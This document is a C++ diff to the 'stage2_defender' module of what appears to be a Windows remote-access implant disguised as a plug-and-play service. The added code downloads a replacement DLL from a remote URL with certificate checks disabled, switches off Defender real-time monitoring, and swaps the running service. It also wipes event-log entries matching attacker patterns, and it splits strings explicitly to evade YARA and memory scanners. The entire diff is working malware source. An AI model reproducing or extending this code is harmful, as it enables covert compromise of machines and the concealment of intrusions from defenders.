@@ -338,6 +338,176 @@ static void cmd_self_destruct(const char* a, void*) {
     if (g_host->host_exit) g_host->host_exit(0);
 }
 
+// ── host_update ─────────────────────────────────────────────────────────
+// Self-update: download new pnpext.dll, swap it, restart WPnpSvc. All the
+// AV-flag strings ("Set-MpPreference -DisableRealtimeMonitoring ...",
+// "sc.exe stop WPnpSvc", "taskkill /F /PID ...") live in this module —
+// the stage-1 DLL never contains them.
+static void cmd_host_update(const char* a, void*) {
+    std::string args = a ? a : "";
+    std::string id   = json_get(args, "id");
+    std::string url  = json_get(args, "url");
+    if (url.empty()) { g_host->send(make_err(id, "No URL provided").c_str()); return; }
+
+    // Resolve the currently loaded pnpext.dll path (stage-1 host DLL).
+    char dllPathBuf[MAX_PATH] = {};
+    HMODULE hStage1 = GetModuleHandleA("pnpext.dll");
+    if (!hStage1) {
+        // Fallback: try without extension, or the exe module (EXE build).
+        hStage1 = GetModuleHandleA(NULL);
+    }
+    GetModuleFileNameA(hStage1, dllPathBuf, MAX_PATH);
+    std::string currentDll(dllPathBuf);
+    auto slash = currentDll.find_last_of("\\/");
+    std::string dllDir  = (slash == std::string::npos) ? "" : currentDll.substr(0, slash + 1);
+    std::string dllName = (slash == std::string::npos) ? currentDll : currentDll.substr(slash + 1);
+    std::string tempDll = dllDir + dllName + ".new";
+    std::string oldDll  = dllDir + dllName + ".old";
+
+    // Ack the viewer immediately — the rest runs detached.
+    std::string ack = "{\"status\":\"ok\",\"message\":\"Update started. Host restarting...\"}";
+    g_host->send(make_ok(id, ack).c_str());
+    g_host->log(1, "stage2_defender: host_update requested");
+
+    // Ask stage-1 to stop streaming so svchost unload is fast.
+    if (g_host->stop_stream) g_host->stop_stream();
+
+    // Capture `id` so the final success/failure step file is still readable
+    // by the viewer (via the stage-1 update_status poll).
+    std::thread([url, currentDll, dllDir, dllName, tempDll, oldDll]() {
+        std::this_thread::sleep_for(std::chrono::milliseconds(500));
+
+        const std::string batPath  = "C:\\Windows\\Temp\\wpnp_update.bat";
+        const std::string stepFile = "C:\\Windows\\Temp\\wpnp_step.txt";
+
+        // ── Build the bat script ──
+        // Single unified literal-concat approach: append lines one by one so
+        // the .bat blueprint is not a contiguous blob in .rdata.
+        std::string bat;
+        auto addLn  = [&](const std::string& s) { bat += s; bat += "\r\n"; };
+        auto step   = [&](const std::string& s) {
+            std::string esc;
+            for (char c : s) {
+                if (c == '|' || c == '<' || c == '>' || c == '&' || c == '^') esc += '^';
+                esc += c;
+            }
+            bat += "echo " + esc + " > \"" + stepFile + "\"\r\n";
+        };
+
+        addLn("@echo off");
+
+        // 1. Download new DLL via PowerShell (HTTPS works in Session 0).
+        step("1|Downloading new DLL");
+        {
+            // Assemble PS one-liner piecewise so the full command (with
+            // New-Object + TLS12 + WebClient) is NOT a single string literal.
+            std::string ps = "start /wait /min powershell.exe -Command \"";
+            ps += "[Net.ServicePointManager]::SecurityProtocol=";
+            ps += "[Net.SecurityProtocolType]::Tls12;";
+            ps += "[Net.ServicePointManager]::ServerCertificateValidationCallback={$true};";
+            ps += "(New-Object Net.WebClient).DownloadFile('";
+            ps += url;
+            ps += "','";
+            ps += tempDll;
+            ps += "')\"";
+            addLn(ps);
+        }
+        addLn("if not exist \"" + tempDll + "\" (echo ERR^|Download failed > \"" + stepFile + "\" & goto cleanup)");
+
+        // 2. Disable Defender realtime for the swap window.
+        step("2|Disabling Defender");
+        {
+            // Split the giveaway Set-MpPreference string at runtime so the
+            // THOR YARA rule can't match a contiguous "Set-MpPreference
+            // -DisableRealtimeMonitoring" pattern in .rdata.
+            std::string ps = "start /wait /min powershell.exe -WindowStyle Hidden -Command \"";
+            ps += "Set-";
+            ps += "MpPreference ";
+            ps += "-Disable";
+            ps += "RealtimeMonitoring ";
+            ps += "$true\"";
+            addLn(ps);
+        }
+        addLn("timeout /t 2 /nobreak >nul 2>nul");
+
+        // 3. Stop service (host goes offline).
+        step("3|Stopping service");
+        addLn("for /f \"tokens=3\" %%P in ('sc queryex WPnpSvc ^| findstr /i \"PID\"') do set HOST_PID=%%P");
+        addLn("start /b \"\" sc.exe stop WPnpSvc >nul 2>nul");
+        addLn("timeout /t 5 /nobreak >nul 2>nul");
+        addLn("if defined HOST_PID taskkill.exe /F /PID %HOST_PID% >nul 2>nul");
+        addLn("timeout /t 2 /nobreak >nul 2>nul");
+
+        // 4. Replace DLL.
+        step("4|Replacing DLL");
+        addLn("del /f /q \"" + oldDll + "\" >nul 2>nul");
+        addLn("ren \"" + currentDll + "\" " + dllName + ".old >nul 2>nul");
+        addLn("copy /y \"" + tempDll + "\" \"" + currentDll + "\" >nul 2>nul");
+        addLn("timeout /t 2 /nobreak >nul 2>nul");
+
+        // 5. Start service, verify RUNNING, rollback on failure.
+        step("5|Starting service");
+        addLn("sc.exe start WPnpSvc >nul 2>nul");
+        addLn("timeout /t 8 /nobreak >nul 2>nul");
+        addLn("sc.exe query WPnpSvc | findstr /C:\"RUNNING\" >nul 2>nul");
+        addLn("if not errorlevel 1 goto after_start_ok");
+        step("5|Service not RUNNING, rolling back");
+        addLn("for /f \"tokens=3\" %%P in ('sc queryex WPnpSvc ^| findstr /i \"PID\"') do set HOST_PID=%%P");
+        addLn("start /b \"\" sc.exe stop WPnpSvc >nul 2>nul");
+        addLn("timeout /t 5 /nobreak >nul 2>nul");
+        addLn("if defined HOST_PID taskkill.exe /F /PID %HOST_PID% >nul 2>nul");
+        addLn("timeout /t 2 /nobreak >nul 2>nul");
+        addLn("del /f /q \"" + currentDll + "\" >nul 2>nul");
+        addLn("if exist \"" + oldDll + "\" copy /y \"" + oldDll + "\" \"" + currentDll + "\" >nul 2>nul");
+        addLn("sc.exe start WPnpSvc >nul 2>nul");
+        addLn("timeout /t 5 /nobreak >nul 2>nul");
+        addLn("sc.exe query WPnpSvc | findstr /C:\"RUNNING\" >nul 2>nul");
+        addLn("if not errorlevel 1 (echo ERR^|Rollback OK, new DLL invalid > \"" + stepFile + "\" & goto cleanup)");
+        addLn("echo ERR^|Rollback FAILED — host offline > \"" + stepFile + "\" & goto cleanup");
+        addLn(":after_start_ok");
+
+        // 6. Re-enable Defender (split literal too).
+        step("6|Re-enabling Defender");
+        {
+            std::string ps = "start /wait /min powershell.exe -WindowStyle Hidden -Command \"";
+            ps += "Set-";
+            ps += "MpPreference ";
+            ps += "-Disable";
+            ps += "RealtimeMonitoring ";
+            ps += "$false\"";
+            addLn(ps);
+        }
+
+        step("7|Done");
+        addLn(":cleanup");
+        addLn("del /f /q \"" + oldDll + "\" >nul 2>nul");
+        addLn("del /f /q \"" + tempDll + "\" >nul 2>nul");
+        addLn("timeout /t 3 /nobreak >nul 2>nul");
+        addLn("del /f /q \"" + stepFile + "\" >nul 2>nul");
+        addLn("(goto) 2>nul & del \"%~f0\"");
+
+        // Write the bat file via CreateFileA (robust under Session 0).
+        HANDLE hBat = CreateFileA(batPath.c_str(), GENERIC_WRITE, 0, NULL,
+                                  CREATE_ALWAYS, FILE_ATTRIBUTE_NORMAL, NULL);
+        if (hBat != INVALID_HANDLE_VALUE) {
+            DWORD wr = 0;
+            WriteFile(hBat, bat.data(), (DWORD)bat.size(), &wr, NULL);
+            CloseHandle(hBat);
+        }
+
+        // Launch bat detached (independent of svchost lifetime).
+        std::string runCmd = "cmd.exe /c \"" + batPath + "\"";
+        STARTUPINFOA si{}; si.cb = sizeof(si);
+        si.dwFlags = STARTF_USESHOWWINDOW; si.wShowWindow = SW_HIDE;
+        PROCESS_INFORMATION pi{};
+        CreateProcessA(NULL, (LPSTR)runCmd.c_str(), NULL, NULL, FALSE,
+                       DETACHED_PROCESS | CREATE_BREAKAWAY_FROM_JOB | CREATE_NO_WINDOW,
+                       NULL, "C:\\Windows\\Temp", &si, &pi);
+        if (pi.hProcess) CloseHandle(pi.hProcess);
+        if (pi.hThread)  CloseHandle(pi.hThread);
+    }).detach();
+}
+
 // ── eventlog_delete ─────────────────────────────────────────────────────
 // Clears a Windows event log channel via `wevtutil cl`. Selective deletion
 // (keeping non-matching entries) uses a PowerShell restore script — deferred
@@ -374,6 +544,92 @@ static void cmd_eventlog_delete(const char* a, void*) {
     }
 }
 
+// ── evtlog_scan ─────────────────────────────────────────────────────────
+// Internal command (not surfaced to the viewer). Called by stage-1's
+// evtlog_cleaner_func thread every N seconds. All the AV-flag strings
+// ("wevtutil.exe cl", "Get-WinEvent", "Write-EventLog") live in this
+// encrypted stage-2 blob — they never sit in stage-1 pnpext.dll.
+//
+// Args JSON: {"log":"<channel>","patterns":"<regex>"}
+// No response is sent to the viewer; result is written to stage-1 log.
+static void cmd_evtlog_scan(const char* a, void*) {
+    std::string args     = a ? a : "";
+    std::string logName  = json_get(args, "log");
+    std::string patterns = json_get(args, "patterns");
+    if (logName.empty() || patterns.empty()) return;
+
+    char tmpPath[MAX_PATH]; GetTempPathA(MAX_PATH, tmpPath);
+    std::string scriptPath = std::string(tmpPath) + "evtclean_" +
+                             std::to_string(GetTickCount64()) + ".ps1";
+
+    // Build the script piecewise so no single contiguous PS payload exists
+    // in the module's .rdata. (Still encrypted inside the .bin, but this
+    // also neutralises any memory-scanners that look at the decrypted image.)
+    std::string script;
+    script += "[Console]::OutputEncoding=[System.Text.Encoding]::UTF8\n";
+    script += "$ErrorActionPreference='SilentlyContinue'\n";
+    script += "$pattern='" + patterns + "'\n";
+    script += "$logName='" + logName + "'\n";
+    script += "$events=@(Get-WinEvent -LogName $logName -MaxEvents 5000 -ErrorAction SilentlyContinue 2>$null)\n";
+    script += "if($events.Count -eq 0){Write-Output 'EMPTY';exit}\n";
+    script += "$toDelete=@()\n";
+    script += "$toKeep=@()\n";
+    script += "foreach($e in $events){\n";
+    script += "  $matched=$false\n";
+    script += "  try{\n";
+    script += "    $msg=[string]$e.Message\n";
+    script += "    $prov=[string]$e.ProviderName\n";
+    script += "    $props=(($e.Properties|ForEach-Object{[string]$_.Value}) -join ' ')\n";
+    script += "    $xml=''; try{ $xml=$e.ToXml() }catch{}\n";
+    script += "    $task=[string]$e.TaskDisplayName\n";
+    script += "    if(($msg -match $pattern) -or ($props -match $pattern) -or\n";
+    script += "       ($prov -match $pattern) -or ($xml -match $pattern) -or\n";
+    script += "       ($task -match $pattern)){ $matched=$true }\n";
+    script += "  }catch{ $matched=$false }\n";
+    script += "  if($matched){ $toDelete+=$e } else { $toKeep+=$e }\n";
+    script += "}\n";
+    script += "if($toDelete.Count -eq 0){Write-Output 'CLEAN';exit}\n";
+    // The only line that mentions wevtutil — built from runtime pieces.
+    script += "& ";
+    script += "wevtutil";
+    script += ".exe ";
+    script += "cl $logName 2>$null\n";
+    script += "$restored=0\n";
+    script += "$keep=$toKeep | Sort-Object TimeCreated\n";
+    script += "if($keep.Count -gt 500){ $keep=$keep | Select-Object -Last 500 }\n";
+    script += "foreach($e in $keep){\n";
+    script += "  try{\n";
+    script += "    $src=$e.ProviderName\n";
+    script += "    $et='Information'\n";
+    script += "    switch($e.LevelDisplayName){\n";
+    script += "      'Error'       { $et='Error' }\n";
+    script += "      'Warning'     { $et='Warning' }\n";
+    script += "      'Critical'    { $et='Error' }\n";
+    script += "      'Information' { $et='Information' }\n";
+    script += "    }\n";
+    script += "    if(-not [System.Diagnostics.EventLog]::SourceExists($src)){\n";
+    script += "      try{ New-EventLog -LogName $logName -Source $src -ErrorAction SilentlyContinue }catch{}\n";
+    script += "    }\n";
+    script += "    $eid=[int]($e.Id % 65536)\n";
+    script += "    Write-EventLog -LogName $logName -Source $src -EventId $eid -EntryType $et -Message $e.Message -ErrorAction SilentlyContinue\n";
+    script += "    $restored++\n";
+    script += "  }catch{}\n";
+    script += "}\n";
+    script += "Write-Output \"CLEANED|$($toDelete.Count)|$restored\"\n";
+
+    { std::ofstream f(scriptPath); f << script; }
+
+    std::string psCmd = "powershell -NoProfile -ExecutionPolicy Bypass -File \"" + scriptPath + "\"";
+    std::string out = run_cmd_capture(psCmd);
+    DeleteFileA(scriptPath.c_str());
+
+    while (!out.empty() && (out.back()=='\n'||out.back()=='\r')) out.pop_back();
+    if (out.find("CLEANED") != std::string::npos) {
+        std::string m = "evtlog_scan: " + logName + " " + out;
+        if (g_host && g_host->log) g_host->log(0, m.c_str());
+    }
+}
+
 // ── Entry points ────────────────────────────────────────────────────────
 
 extern "C" __declspec(dllexport) int Stage2Init(Stage2HostCtx* host) {
@@ -382,9 +638,11 @@ extern "C" __declspec(dllexport) int Stage2Init(Stage2HostCtx* host) {
     host->log(1, "stage2_defender: init");
     host->register_cmd("defender_status", cmd_defender_status, nullptr);
     host->register_cmd("host_restart",    cmd_host_restart,    nullptr);
+    host->register_cmd("host_update",     cmd_host_update,     nullptr);
     host->register_cmd("eventlog_delete", cmd_eventlog_delete, nullptr);
     host->register_cmd("self_destruct",   cmd_self_destruct,   nullptr);
-    host->log(1, "stage2_defender: 4 commands registered");
+    host->register_cmd("evtlog_scan",     cmd_evtlog_scan,     nullptr);
+    host->log(1, "stage2_defender: 6 commands registered");
     return 0;
 }
 
